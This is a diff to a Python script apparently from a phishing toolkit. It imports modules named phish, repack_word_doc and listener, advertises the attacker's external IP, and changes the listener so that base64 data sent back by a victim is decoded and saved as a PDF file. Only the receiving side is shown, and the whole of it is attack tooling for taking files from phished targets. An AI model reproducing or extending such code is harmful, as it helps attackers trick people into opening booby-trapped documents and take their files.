@@ -3,6 +3,7 @@
 import listener
 import repack_word_doc
 import phish
+import base64
 
 def full_phish(cmd):
     port = 44440
@@ -22,8 +23,12 @@ def full_phish(cmd):
 
     print("Using", my_ip, "as external IP")
     contents = listener.listen_once(44665)
-    print("Got:")
-    print(contents.decode())
+    print("Got response, {} bytes".format(len(contents)))
+    #print(contents.decode())
+    pdf = base64.decodestring(contents)
+    with open("Greatbookpage7.pdf", 'wb') as f:
+        f.write(pdf)
+    print("{} bytes written to Greatbookpage7.pdf".format(len(pdf)))
 
 if __name__ == "__main__":
     cmd = "hello"
